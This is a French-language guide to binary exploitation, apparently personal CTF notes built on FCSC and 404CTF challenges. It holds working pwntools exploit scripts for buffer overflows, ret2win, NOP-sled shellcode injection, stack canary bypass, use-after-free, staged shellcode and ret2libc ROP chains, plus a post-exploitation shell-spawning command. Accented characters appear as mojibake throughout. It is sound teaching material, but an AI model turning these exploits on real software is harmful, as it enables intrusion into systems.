# Guide des Buffer Overflows - Exploitation Binaire

> **Note :** Ce document est un index de navigation. Pour chaque technique, des fiches d√©taill√©es avec des exemples r√©els d√©sassembl√©s dans radare2 sont disponibles dans ce dossier.

## Table des mati√®res
1. [Vue d'ensemble](#vue-densemble)
2. [Pr√©requis](#pr√©requis)
3. [Types d'exploitation](#types-dexploitation)
4. [Protections modernes](#protections-modernes)
5. [M√©thodologie g√©n√©rale](#m√©thodologie-g√©n√©rale)
6. [Ressources compl√©mentaires](#ressources-compl√©mentaires)

---

## Vue d'ensemble

| Type | Description | Pr√©requis | Fiche d√©taill√©e |
|:---|:---|:---|:---|
| **Buffer Overflow simple** | D√©passer le tampon pour d√©clencher une condition | Buffer non prot√©g√© | (cette doc) |
| **BOF + Condition de Victoire Cach√©e** | √âcraser une variable avec la valeur magique trouv√©e dans r2 | Lire la valeur magique dans le d√©sassemblage | (cette doc) |
| **ret2win** | Rediriger l'ex√©cution vers une fonction cach√©e | Conna√Ætre l'adresse de la fonction cible | (cette doc) |
| **Shellcode Injection + Stack Leak** | Injecter un shellcode sur la pile ex√©cutable | NX disabled + stack leak | (cette doc) |
| **Stack Canary Bypass** | Fuiter le canary via format string puis buffer overflow | Fuite d'adresse, pas de PIE | [canary_exploitation.md](canary_exploitation.md) |
| **Use-After-Free** | R√©utiliser un bloc heap lib√©r√© pour √©craser un pointeur de fonction | malloc/free sans mise √† NULL | [Use_After_Free.md](Use_After_Free.md) |
| **Staged Shellcode** | Stager 13 octets + mmap RWX pour contourner une limite de taille | Zone mmap ex√©cutable | [staged_shellcode.md](staged_shellcode.md) |
| **Ret2libc + ROP** | Utiliser les fonctions de la libc via une ROP chain | Leak d'adresse libc, NX enabled | [ret2libc.md](ret2libc.md) |

---

## Pr√©requis

### Outils essentiels
```bash
pip install pwntools
sudo pacman -S radare2 gdb    # Arch Linux
sudo apt install radare2 gdb  # Debian/Ubuntu

# V√©rification des protections d'un binaire
checksec --file <binary>
```

### Concepts cl√©s
- **Stack** : Zone m√©moire LIFO contenant variables locales et adresses de retour
- **RIP/RBP** : Registres pointant vers la prochaine instruction et la base de la stack frame
- **Heap** : Zone m√©moire dynamique g√©r√©e par malloc/free
- **GOT** : Table des adresses r√©elles des fonctions libc apr√®s r√©solution dynamique
- **Padding** : Octets de remplissage pour atteindre l'adresse de retour

### Architecture et tailles

| Architecture | Taille pointeur | Taille canary | Taille saved RBP | Encodage pwntools |
|:---:|:---:|:---:|:---:|:---:|
| x86 (32 bits) | 4 octets | 4 octets | 4 octets | `p32()` |
| x86-64 (64 bits) | 8 octets | 8 octets | 8 octets | `p64()` |

> ‚ö†Ô∏è **Important** : Toujours v√©rifier l'architecture avec `checksec` et confirmer les offsets avec `afvd` dans radare2 plut√¥t que de les calculer au feeling.

---

## Types d'exploitation

### 1. Buffer Overflow Simple

Le buffer overflow basique consiste √† √©craser la m√©moire au-del√† d'un tampon pour modifier le comportement du programme.

#### Exemple vuln√©rable
```c
int main() {
    char buffer[10];
    int access = 0;

    printf("Entrez votre mot de passe : ");
    gets(buffer);  // ‚ö†Ô∏è VULN√âRABLE : pas de limite de taille

    if (access == 1) {
        printf("Acc√®s autoris√© !\n");
    }
    return 0;
}
```

#### Exploitation
```python
from pwn import *

buffer_size  = 10
target_value = p32(1)   # valeur √† √©crire dans 'access'
payload      = b'A' * buffer_size + target_value

io = process('./vulnerable')
io.sendlineafter(b'password: ', payload)
io.interactive()
```

**Explication** : En d√©passant les 10 octets du buffer, on √©crase la variable `access` qui suit en m√©moire.

---

### Challenge r√©el ‚Äî Aarchibald (FCSC 2019)

> üìÑ **Challenge r√©el : `Aarchibald` ‚Äî FCSC 2019 ‚Äî Architecture AArch64**

#### Particularit√© : XOR sur le mot de passe

Le programme applique un XOR `0x36` sur les 13 premiers octets de l'input avant de le comparer :

```c
for (i = 0; i < 0xd; i++) {
    sUserInput[i] = sUserInput[i] ^ 0x36;
}
strncmp(sUserInput, "eCfSDFwEeAYDr", 0xd);
```

Il faut donc envoyer `"eCfSDFwEeAYDr" ^ 0x36 = "SuPerpAsSworD"` pour passer le strncmp. Le XOR s'arr√™te √† 13 octets ‚Äî le reste du payload n'est pas modifi√©.

#### Layout de la pile (confirm√© par r2)

```asm
add x0, x29, 0x18    ‚Üê sUserInput √† x29+0x18
ldr w1, [x29, 0x3c]  ‚Üê trigger  √† x29+0x3c
```

```
x29 + 0x18  ‚Üê sUserInput (d√©but du buffer)
x29 + 0x3c  ‚Üê trigger    (valeur initiale : 0x45435343)

distance = 0x3c - 0x18 = 0x24 = 36 octets
```

`fgets` lit `0x28 = 40 octets` ‚Äî `trigger` est √† l'offset 36 √† l'int√©rieur du buffer. Il suffit de le remplir jusqu'√† `trigger` pour l'√©craser.

#### Condition de victoire

```c
if (trigger != 0x45435343) {
    system("/bin/dash");   // shell !
}
```

N'importe quelle valeur diff√©rente de `0x45435343` d√©clenche le shell ‚Äî les 4 derniers octets du `cyclic(27)` suffisent.

#### Exploitation

```python
from pwn import *

exe = context.binary = ELF('aarchibald.bin')

sPassword = 'SuPerpAsSworD'                   # 13 octets ‚Üí passe le strncmp
charge    = cyclic(0x28 - len(sPassword))      # cyclic(27) ‚Üí remplit jusqu'√† trigger + 4 octets
payload   = flat(sPassword, charge)            # 40 octets au total

io = process('./aarchibald.bin')
io.sendlineafter(b":", payload)
io.interactive()   # cat flag
```

#### Pourquoi `cyclic` et pas des `A` ?

Les 4 octets qui atterrissent sur `trigger` viennent de `cyclic[23:27]` ‚Äî une valeur quelconque diff√©rente de `0x45435343`. On aurait pu √©crire `b'A' * 27` mais `cyclic` est plus pratique pour d√©bugger si l'offset change.

> ‚ö†Ô∏è **Architecture AArch64** ‚Äî le frame pointer est `x29` (et non `rbp` en x86). Les offsets se lisent depuis `x29` dans r2. La logique d'exploitation reste identique.

---

### 2. Buffer Overflow avec Condition de Victoire Cach√©e

Le programme ne pose pas une vraie protection anti-debug ‚Äî il pose une **condition de victoire d√©guis√©e**. La valeur `AAAAAAAA` n'est pas d√©tect√©e comme un pattern de debug : c'est simplement la valeur initiale qui indique que le buffer n'a **pas √©t√© d√©bord√©**. N'importe quelle autre valeur (des `B`, un `cyclic()`, etc.) passe la premi√®re v√©rification. Mais seule la valeur magique exacte `0x1122334455667788` d√©clenche le shell.

> üìÑ **Challenge r√©el : `bofbof` ‚Äî FCSC 2021**

#### Ce que fait le programme

```asm
movabs rax, 0x4141414141414141   ; pose 'AAAAAAAA' comme valeur initiale
mov qword [var_8h], rax          ; var_8h = valeur initiale sur la pile

gets(s)                          ; lit l'input utilisateur

cmp qword [var_8h], rax          ; var_8h est-elle ENCORE 'AAAAAAAA' ?
je 0x121c                        ‚Üê oui ‚Üí buffer pas d√©bord√© ‚Üí sort proprement

movabs rax, 0x1122334455667788   ; valeur magique attendue
cmp qword [var_8h], rax
jne 0x1210                       ‚Üê pas √©gal ‚Üí "Almost there!" ‚Üí rat√©
call sym.vuln                    ‚Üê √©gal ‚Üí shell !
```

La logique compl√®te :

```
var_8h == 'AAAAAAAA'          ‚Üí buffer intact ‚Üí sort proprement
var_8h == 0x1122334455667788  ‚Üí valeur magique ‚Üí shell !
var_8h == autre chose         ‚Üí "Almost there!" ‚Üí rat√©
         (BBBBBBBB, cyclic, etc. tombent tous ici)
```

**Il faut donc conna√Ætre la valeur magique `0x1122334455667788`** ‚Äî trouv√©e dans r2 ‚Äî et l'√©crire exactement √† l'offset de `var_8h`.

#### Calculer l'offset depuis r2

```asm
sub rsp, 0x30        ‚Üê stack frame de 48 octets
lea rax, [s]         ‚Üê s (buffer gets) est √† rbp-0x30
mov qword [var_8h]   ‚Üê var_8h (sentinelle) est √† rbp-0x08
```

```
rbp - 0x30  ‚Üê s       (d√©but du buffer)
rbp - 0x08  ‚Üê var_8h  (la sentinelle)

distance = 0x30 - 0x08 = 0x28 = 40 octets
```

> **Note :** `afvd` peut ne pas retourner les variables si le binaire manque de symboles de debug. Dans ce cas, calculer depuis `sub rsp, 0xXX` et les `lea`/`mov` dans le d√©sassemblage.

#### Exploitation

```python
from pwn import *

exe     = context.binary = ELF('./bofbof')
valeur_magique = 0x1122334455667788

# 40 octets pour atteindre var_8h, puis on √©crase avec la valeur magique
payload = cyclic(0x28) + p64(valeur_magique)

io = process('./bofbof')
io.sendlineafter(b">>>", payload)
io.interactive()
```

#### Layout de la pile

```
rbp - 0x30  ‚Üê s          : [ cyclic(40) = 0x28 octets        ]
rbp - 0x08  ‚Üê var_8h     : [ p64(0x1122334455667788)          ] ‚Üê valeur magique
rbp + 0x00  ‚Üê saved RBP
rbp + 0x08  ‚Üê adresse ret
```

Le payload √©crase exactement `var_8h` avec la valeur attendue ‚Üí la comparaison passe ‚Üí `call sym.vuln` ‚Üí `/bin/sh`.

---

### 3. Ret2Win

> üìÑ **Challenge r√©el : `Gorfou en danger 1` ‚Äî 404CTF 2025**

Rediriger l'ex√©cution vers une fonction existante mais jamais appel√©e normalement.

#### Calculer l'offset depuis radare2

```bash
pdf @ sym.fonction_vulnerable
# chercher : sub rsp, 0xXXX  ‚Üê taille du buffer
# afvd                        ‚Üê variables locales et leurs offsets
```

```
offset = taille_buffer + 8 (saved RBP)
```

> ‚ö†Ô∏è **Toujours v√©rifier `afvd`** dans radare2 plut√¥t que de faire le calcul de t√™te ‚Äî des variables locales suppl√©mentaires peuvent modifier l'offset r√©el.

#### Exploitation basique (sans canary, sans PIE)
```python
from pwn import *

exe     = context.binary = ELF('./chall')
offset  = 0x108           # v√©rifi√© dans r2 : 0x100 buffer + 0x8 saved RBP
win     = exe.symbols['win']

payload = flat(
    cyclic(offset),
    p64(win)
)

io = process('./chall')
io.sendlineafter(b">", payload)
io.interactive()
```

#### Si la stack n'est pas align√©e (SIGSEGV apr√®s ret)

> üìÑ **Challenge r√©el : `poney` ‚Äî FCSC 2020**

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

En x64, `system()` utilise des instructions SSE (`movaps`) qui exigent que **RSP soit align√© sur 16 octets** au moment du `call`. Si ce n'est pas le cas ‚Üí SIGSEGV silencieux, m√™me si l'adresse de retour est correcte.

**Pourquoi RSP peut √™tre d√©salign√© :**

L'√©tat de RSP au moment du `call system` d√©pend de toute la cha√Æne d'appels depuis `_start` ‚Äî pas seulement de l'offset du buffer. Chaque `push`/`ret` d√©cale RSP de 8 octets. Selon le nombre d'op√©rations dans la cha√Æne, RSP peut se retrouver d√©salign√© de 8 octets au moment critique.

**La r√®gle :**
```
avant un call  ‚Üí RSP doit √™tre ‚â° 0 mod 16  (se termine par 0 en hex)
apr√®s un ret   ‚Üí RSP += 8                   (peut le d√©caler de 0 √† 8)
```

**V√©rifier dans GDB :**
```bash
./exploit.py LOCAL GDB
# breakpoint juste avant call system
break *0x400681
continue
info registers rsp
# rsp se termine par 0 ‚Üí align√© ‚Üí pas besoin du gadget
# rsp se termine par 8 ‚Üí d√©salign√© ‚Üí gadget ret n√©cessaire
```

Valeurs observ√©es sur le challenge `poney` :
```
# SANS gadget ret ‚Üí SIGSEGV
rsp  0x7ffdd5523b48   ‚Üê se termine par 8 ‚Üí d√©salign√© ‚Üí movaps ‚Üí crash

# AVEC gadget ret ‚Üí shell
rsp  0x7ffc9268b120   ‚Üê se termine par 0 ‚Üí align√©    ‚Üí movaps ‚Üí OK
```

Un gadget `ret` suppl√©mentaire consomme 8 octets et remet RSP align√©. On ne peut pas le d√©terminer de t√™te sans tracer toute la cha√Æne depuis `_start` ‚Äî le r√©flexe est de l'ajouter si l'exploit crash sur `movaps`.

```python
from pwn import *

exe = context.binary = ELF('./poney')
win = exe.symbols['shell']
ret = 0x004006db              # gadget ret trouv√© dans r2 : adresse du ret de main

payload = flat(
    cyclic(0x20 + 8),         # 0x20 buffer + 8 saved RBP
    p64(ret),                 # aligne RSP sur 16 octets avant shell()
    p64(win)
)

io = process('./poney')
io.sendlineafter(b">>>", payload)
io.interactive()
```

> ‚ö†Ô∏è **L'offset du buffer n'a aucun lien avec l'alignement** ‚Äî RSP peut √™tre d√©salign√© m√™me avec un offset pair. Seul GDB permet de le confirmer avec certitude.

---

### 4. Shellcode Injection + Stack Leak (NX disabled)

> üìÑ **Challenge r√©el : `Gorfou en danger 2` ‚Äî 404CTF 2025**

Quand NX est **d√©sactiv√©**, la pile est ex√©cutable ‚Äî on peut y injecter directement un shellcode. Comme ASLR randomise l'adresse de la pile, il faut d'abord **fuiter une adresse de la stack** pour savoir o√π atterrir.

#### Pr√©requis

```bash
checksec --file ./chall
# NX: NX disabled   ‚Üê stack ex√©cutable, shellcode possible
```

#### La technique en deux passes

```
PASSE 1 ‚Äî Stack Leak
  overflow ‚Üí debug_info() ‚Üí affiche &local_var (adresse stack) ‚Üí retour main
  addr_buf = stack_leak - 0x100   (distance calcul√©e dans GDB)

PASSE 2 ‚Äî Shellcode
  overflow ‚Üí [ NOP sled ][ shellcode /bin/sh ][ padding ][ addr_buf ]
  ex√©cution glisse sur le NOP sled ‚Üí shellcode ‚Üí shell !
```

#### Construction du payload

```python
from pwn import *

exe   = context.binary = ELF('./chall')

def leak_stack(io):
    payload = flat(
        cyclic(0x108),
        exe.symbols['debug_info'],  # affiche l'adresse stack
        exe.symbols['main']         # retour pour passe 2
    )
    io.sendlineafter(b">", payload)
    io.recvuntil(b"Stack address : ")
    stack_leak = int(io.recvline().strip(), 16)
    log.success(f"stack leak : {hex(stack_leak)}")
    return stack_leak

def build_shellcode_payload(stack_leak):
    shellcode = asm(shellcraft.amd64.linux.sh(), bits=64)
    sled      = b"\x90" * 9          # NOP sled
    padding   = cyclic(0x108 - len(sled) - len(shellcode))
    ret_addr  = stack_leak - 0x100   # d√©but du buffer (trouv√© dans GDB)

    return flat(sled, shellcode, padding, ret_addr)

io = process('./chall')
stack_leak = leak_stack(io)
io.sendline(build_shellcode_payload(stack_leak))
io.interactive()
```

> ‚ö†Ô∏è **`stack_leak - 0x100`** ‚Äî la distance entre l'adresse fuit√©e et le d√©but du buffer se confirme dans GDB en regardant `$rsp` au moment de `gets()`. Ne pas l'estimer sans v√©rification.

---

### 6. Stack Canary Bypass

> üìÑ **Fiche compl√®te : [canary_exploitation.md](canary_exploitation.md)**

Le canary est une valeur secr√®te pos√©e sur la pile entre le buffer et l'adresse de retour. Si on l'√©crase, le programme se suicide. La technique consiste √† **fuiter** sa valeur via une format string avant de faire l'overflow.

#### R√©sum√© de la technique

```
1. Fuite du canary via %17$p (offset √† trouver dans r2)
2. Buffer overflow en r√©injectant le vrai canary
3. Ret vers la fonction cible
```

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   buffer     ‚îÇ ‚Üê cyclic(offset)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   CANARY     ‚îÇ ‚Üê canary_leak (valeur vol√©e, pas d'alarme)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  saved RBP   ‚îÇ ‚Üê cyclic(8) junk data
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ adresse ret  ‚îÇ ‚Üê p64(win_addr)
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

> ‚ö†Ô∏è **Le canary se termine toujours par `\x00`** ‚Äî filtrer avec `endswith("00")` et `value > 0xFFFFFFFF` pour l'identifier automatiquement. Voir la fonction `canary_auto_leak()` dans [canary_exploitation.md](canary_exploitation.md).

---

### 7. Use-After-Free (UAF)

> üìÑ **Fiche compl√®te : [Use_After_Free.md](Use_After_Free.md)**

Un UAF se produit quand un pointeur n'est pas mis √† NULL apr√®s `free()`. Un `malloc()` de m√™me taille r√©cup√®re le m√™me bloc, ce qui permet d'√©craser son contenu ‚Äî notamment un **pointeur de fonction**.

#### R√©sum√© de la technique

```
1. malloc(objet)  ‚Üí objet->fonction = incStr
2. free(objet)    ‚Üí pointeur PAS mis √† NULL ‚Üí UAF !
3. malloc(msg)    ‚Üí m√™me taille ‚Üí m√™me bloc
4. √©crire payload ‚Üí √©crase objet->fonction avec incInt
5. appel fonction ‚Üí appelle incInt au lieu de incStr
```

```python
# Le payload √©crase le pointeur de fonction √† l'offset +0x40
payload = cyclic(64) + p64(exe.symbols['cible'])
```

> ‚ö†Ô∏è **V√©rifier dans r2 que `free()` ne met pas le pointeur √† NULL** ‚Äî c'est la condition sine qua non du UAF. Voir [Use_After_Free.md](Use_After_Free.md) pour l'analyse compl√®te de `useItem`.

---

### 8. Staged Shellcode

> üìÑ **Fiche compl√®te : [staged_shellcode.md](staged_shellcode.md)**

Quand la taille d'upload est limit√©e (ex: 13 octets), on envoie un **stager** minimaliste qui appelle `read()` pour charger un shellcode complet sans contrainte de taille.

#### R√©sum√© de la technique

```
upload(stage1 = 13 octets)  ‚Üí stager dans zone mmap
execute(stage1)             ‚Üí syscall read(0, firmware, 0x1000)
send(stage2)                ‚Üí NOP sled + shellcode /bin/sh
                            ‚Üí shell !
```

> ‚ö†Ô∏è **Toujours v√©rifier `args(...)` dans `pdf @ sym.apply_update`** pour savoir quel registre pointe vers la zone mmap au moment de l'appel ‚Äî c'est ce qui dicte la premi√®re instruction du stager. Voir [staged_shellcode.md](staged_shellcode.md).

> ‚ö†Ô∏è **NX activ√© ne bloque pas** si `mmap` est appel√© avec `PROT_EXEC` ‚Äî la zone firmware est explicitement ex√©cutable ind√©pendamment de NX.

---

### 9. Ret2libc + ROP Chain

> üìÑ **Fiche compl√®te : [ret2libc.md](ret2libc.md)**

Quand NX est activ√© (pas de shellcode sur la pile), on redirige l'ex√©cution vers `system("/bin/sh")` dans la libc via une ROP chain. ASLR impose de fuiter une adresse libc au pr√©alable.

#### R√©sum√© de la technique en deux passes

```
PASSE 1 ‚Äî Leak
  overflow ‚Üí debug_info() ‚Üí affiche printf@GOT ‚Üí retour main
  libc_base = printf_leak - libc.symbols['printf']

PASSE 2 ‚Äî ROP chain
  overflow ‚Üí ret ‚Üí pop rdi ; ret ‚Üí &"/bin/sh" ‚Üí system()
```

```python
payload = flat(
    cyclic(0x108),
    p64(ret),        # alignement stack x64
    p64(pop_rdi),    # gadget : met /bin/sh dans rdi
    p64(binsh),      # adresse /bin/sh dans libc
    p64(system)      # system("/bin/sh")
)
```

> ‚ö†Ô∏è **La libc fournie avec le challenge peut diff√©rer de la libc syst√®me** ‚Äî toujours utiliser `ELF('./libc.so.6')` avec la libc du serveur cible pour que les offsets soient corrects.

---

## Protections modernes

| Protection | Description | Bypass | Fiche |
|:---|:---|:---|:---|
| **NX** | Stack non ex√©cutable | ret2libc, ROP, ou mmap PROT_EXEC | [ret2libc.md](ret2libc.md), [staged_shellcode.md](staged_shellcode.md) |
| **ASLR** | Adresses libc/stack al√©atoires | Leak d'adresse via GOT ou format string | [ret2libc.md](ret2libc.md) |
| **PIE** | Code binaire √† adresse al√©atoire | Leak d'adresse du binaire | ‚Äî |
| **Stack Canary** | Valeur secr√®te avant saved RIP | Leak via format string | [canary_exploitation.md](canary_exploitation.md) |
| **Full RELRO** | GOT en lecture seule | GOT overwrite impossible | ‚Äî |
| **Partial RELRO** | GOT modifiable | Lecture GOT possible pour leak | [ret2libc.md](ret2libc.md) |

### Lire checksec rapidement

```bash
checksec --file ./chall
```

```
Arch:    amd64-64-little   ‚Üê x64 ‚Üí p64(), saved RBP = 8 octets
RELRO:   Partial RELRO     ‚Üê GOT lisible ‚Üí leak possible
Stack:   Canary found      ‚Üê il faut fuiter le canary avant l'overflow
NX:      NX enabled        ‚Üê pas de shellcode sur la pile
PIE:     No PIE            ‚Üê adresses du binaire fixes ‚Üí symbols directs
```

---

## M√©thodologie g√©n√©rale

### 1. Reconnaissance

```bash
file ./chall
checksec --file ./chall
strings ./chall | grep -E "flag|win|system|sh"
```

### 2. Analyse statique dans radare2

```bash
r2 ./chall
aaa              # analyse compl√®te
afl              # liste des fonctions
pdf @ sym.main   # d√©sassembler main
afvd             # variables locales et offsets ‚Üí calcul de l'offset BOF
```

**Ce qu'on cherche :**
- `sub rsp, 0xXXX` ‚Üí taille du buffer
- `afvd` ‚Üí offset exact jusqu'au canary et √† l'adresse de retour
- `args(rdi)` ‚Üí quel registre contient quoi au moment d'un appel
- `malloc` / `free` ‚Üí pr√©sence d'un UAF potentiel
- `mmap` avec `prot=7` ‚Üí zone ex√©cutable

### 3. Trouver l'offset avec cyclic

```python
def find_offset():
    p       = process(context.binary.path)
    pattern = cyclic(0x200)
    p.sendline(pattern)
    p.wait()
    core    = p.corefile
    rip     = core.rip
    offset  = cyclic_find(rip)
    log.success(f"Offset : {offset}")
    return offset
```

### 4. Exploitation

Selon les protections d√©tect√©es :

```
Canary ?   ‚Üí fuiter d'abord  ‚Üí voir canary_exploitation.md
NX ?       ‚Üí ret2libc / ROP  ‚Üí voir ret2libc.md
PIE ?      ‚Üí fuiter binaire  ‚Üí leak d'adresse du binaire
mmap RWX ? ‚Üí staged shellcode ‚Üí voir staged_shellcode.md
UAF ?      ‚Üí heap exploit    ‚Üí voir Use_After_Free.md
```

### 5. Post-exploitation

```bash
# Une fois le shell obtenu
id
cat flag.txt
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Ressources compl√©mentaires

### Documentation
- [Pwntools Documentation](https://docs.pwntools.com/)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [ROP Emporium](https://ropemporium.com/)

### Challenges pratiques
- [404CTF](https://404ctf.fr/)
- [pwnable.kr](http://pwnable.kr/)
- [PicoCTF](https://picoctf.org/)
- [Root Me](https://www.root-me.org/)

### Commandes radare2 essentielles

```bash
aaa              # analyse compl√®te
afl              # liste des fonctions
pdf @ sym.main   # d√©sassembler une fonction
afvd             # variables locales + offsets
afl | grep -E "malloc|free|win|flag"   # filtrer les fonctions int√©ressantes
```

---

*Index mis √† jour apr√®s exploitation r√©elle des challenges 404CTF 2023/2025*
*Fiches d√©taill√©es bas√©es sur l'analyse radare2 des vrais binaires*
*Outils : pwntools, radare2, GDB + GEF*
